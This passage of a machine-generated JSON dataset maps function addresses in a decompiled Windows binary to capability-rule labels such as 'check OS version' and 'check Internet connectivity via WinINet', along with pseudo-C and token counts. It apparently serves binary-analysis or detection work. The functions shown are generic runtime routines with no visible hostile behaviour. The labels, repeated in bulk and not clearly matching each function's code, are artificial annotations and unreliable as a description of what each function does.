            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415cb8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x4aa994;\n    puStack20 = 0x415ccc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x415d19;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.0040669c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x4aa990 + iVar1 * 4) != *0x4a1a64) {\n                fcn.00404640();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x415d20;\n    uStack24 = 0x4aa994;\n    uStack28 = 0x415d18;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 281
    },
    "00415f5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00415f5c(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x4aa990 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x4aa994;\n        puStack28 = 0x415f97;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x416004;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00415f5c::var_1h + 1;\n        iVar2 = fcn.0040669c();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x4aa990 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x41600b;\n        uStack32 = 0x4aa994;\n        uStack36 = 0x416003;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "00416314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00416314(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00409dd8();\n        return uVar2;\n    }\n    iVar3 = fcn.004162bc();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00409980();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00409980();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00409dd8();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.004162c8();\n    }\n    return uVar2;\n}\n",
        "token_count": 213
    },
    "004163e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004163e8(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 398
    },
    "00419dac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419dac(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "00419dcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419dcc(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "0041fe5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fe5c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0041fe7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fe7c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00418340": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418340(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.004182e0();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.004182e0();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.0040486c();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "004183b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004183b0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.004194b8();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 197
    },
    "004184f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004184f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x4185a8;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00404520();\n    fcn.004056d0();\n    iVar1 = fcn.0041844c();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040daf0(0, &var_10ch);\n        fcn.00404eb4();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00404610();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.004194b8();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x4185af;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 355
    },
    "004185fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004185fc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.004185dc();\n            if (cVar1 != '\\0') {\n                fcn.00419504();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.004185dc();\n            if (cVar1 != '\\0') {\n                fcn.00419504();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.004185dc();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "0041880c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041880c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419610();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.0041844c();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "004188e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004188e0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.004187c8();\n    if (iVar2 == 0) {\n        fcn.00418850(&stack0xfffffffc);\n    }\n    fcn.004182d4();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.00419610();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.00419610();\n                    cVar1 = fcn.0040486c();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.004187c8(),  iVar4 == iVar2)) {\n                        fcn.00419504();\n                        fcn.004194b8();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00418a70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418a70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.00419610();\n            fcn.004185fc();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00404640();\n                fcn.00419504();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00418ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418ac0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x418ad5;\n        in_EAX = fcn.00404964();\n    }\n    puStack48 = 0x418ae8;\n    fcn.00404610();\n    puStack48 = 0x418af4;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x418b04;\n    fcn.004189ac();\n    uStack52 = 0x418bbf;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x4aa9c4 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.00419610();\n            cVar2 = fcn.004184b4();\n            if (cVar2 != '\\0') {\n                fcn.004194b8();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x4aa9c4 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.00419610();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.004194b8();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x418bc6;\n    uStack52 = 0x418bbe;\n    fcn.00418a64();\n    return;\n}\n",
        "token_count": 546
    },
    "00418c1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00418c1c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x418c39;\n    fcn.004189ac();\n    uStack32 = 0x418c93;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419610();\n            iVar1 = fcn.0041844c();\n            if (iVar1 != 0) {\n                fcn.00404f60();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x418c9a;\n    uStack32 = 0x418c92;\n    iVar2 = fcn.00418a64();\n    return iVar2;\n}\n",
        "token_count": 296
    },
    "00419004": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00419004(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x41901c;\n    iVar1 = fcn.00419980();\n    uStack28 = 0x41906e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419610();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404f60();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x419075;\n    uStack28 = 0x41906d;\n    uVar3 = fcn.004199e4();\n    return uVar3;\n}\n",
        "token_count": 299
    },
    "00419104": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419104(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4aa9c8 == 0) {\n        *0x4aa9c8 = fcn.00404610();\n    }\n    iVar1 = fcn.0041966c();\n    if (iVar1 < 0) {\n        fcn.004194b8();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00419144": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419144(void)\n\n{\n    if (*0x4aa9c8 != 0) {\n        fcn.00419754();\n    }\n    return;\n}\n",
        "token_count": 40
    },
    "0041915c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041915c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x4aa9c8 != 0) && (iVar3 = *(*0x4aa9c8 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.00419610();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "0041919c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041919c(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4aa9b4 != NULL) {\n        uVar1 = (**0x4aa9b4)();\n        return uVar1;\n    }\n    uVar1 = fcn.0041915c();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 91
    },
    "004192cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004192cc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.004075b8();\n    fcn.00404640();\n    iVar1 = fcn.004075b8();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.004196f8();\n    iVar3 = fcn.004075b8();\n    *(iVar3 + 8) = uVar2;\n    fcn.00419504();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.004075b8();\n        *(iVar1 + 0xc) = 0;\n        fcn.00404640();\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004193d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004193d0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x4193e6;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x4aa9b0 + 0x14))();\n    uStack24 = 0x41947e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x419494 == (*(var_4h + 0x1c) & *0x419490);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x41941b;\n        puStack20 = &stack0xfffffffc;\n        fcn.00419244();\n    }\n    uStack36 = 0x41945f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404518();\n    var_9h = fcn.00419328(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.0041929c();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x419466;\n    if (var_ah != '\\0') {\n        uStack36 = 0x41945e;\n        fcn.004192cc();\n    }\n    return;\n}\n",
        "token_count": 443
    },
    "00419a44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a44(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00419a20(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402ef0();\n                fcn.00403ae4();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00419a38();\n                    fcn.004030ec();\n                }\n                fcn.00402f0c();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "00419ae8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
